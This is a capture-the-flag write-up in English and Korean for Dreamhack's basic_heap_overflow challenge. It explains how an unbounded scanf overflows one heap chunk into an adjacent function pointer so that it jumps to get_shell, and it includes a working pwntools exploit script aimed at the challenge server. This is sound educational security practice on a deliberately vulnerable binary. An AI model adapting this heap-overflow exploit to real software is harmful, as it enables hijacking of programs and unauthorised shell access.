+++
date = '2026-05-12'
draft = false
title = 'Dreamhack basic_heap_overflow Writeup'
ShowToc = true
tags = ["Dreamhack", "pwn"]
+++


## Challenge overview
    
이 문제는 서버에서 작동하고 있는 서비스(basic_heap_overflow)의 바이너리와 소스 코드가 주어집니다.
프로그램의 취약점을 찾고 익스플로잇해 셸을 획득한 후, "flag" 파일을 읽으세요.
"flag" 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
플래그의 형식은 DH{...} 입니다.

---

Arch:     i386-32-little
RELRO:    No RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)

---

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  void *v4; // [esp+8h] [ebp-10h]
  void (**v5)(void); // [esp+Ch] [ebp-Ch]

  v4 = malloc(0x20u);
  v5 = (void (**)(void))malloc(0x20u);
  initialize();
  *v5 = (void (*)(void))table_func;
  __isoc99_scanf("%s", v4);
  if ( *v5 )
    (*v5)();
  return 0;
}
```

## Identifying the vulnerabilities

We have a `get_shell` function, and an overflow: `__isoc99_scanf("%s", v4);` will allow us to overwrite stuff in the heap.

And if we look carefully in the decompiled code, we can see that both `table_func` and `v4` get allocated on the heap. And since the first one is our chunk, we can overwrite the location of the `v5` with `get_shell`.

![challenge-screenshot](chunks.png#center)

Pretty simple, I crafted a short payload and I got it working locally. Remotely, I got EOF though, so something must've gotten misaligned. I modified the padding to the shell function by 8 and it worked fine remotely after that.

![challenge-screenshot](flag.png#center)

## The exploit

```python
from pwn import *
elf = ELF('/home/kali/Downloads/dreamhack/basic_heap_overflow/basic_heap_overflow')

#context.arch = 'amd64'
cyberedu = 'host3.dreamhack.games:9288'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    
#gdb.attach(p, gdbscript = '''
#b * 0x80486fc
#c
#''')


getshell = 0x804867B
p.sendline(b"A"*8*5 + p32(getshell))
#8*5 remote, 8*6 local
#overwrite table_funcs address 

p.interactive()
```

---

As always, the full code can be found on my GitHub 
**[here](https://github.com/irinasusca/ctf-writeups/blob/main/dreamhack/basic_heap_overflow.py)**.
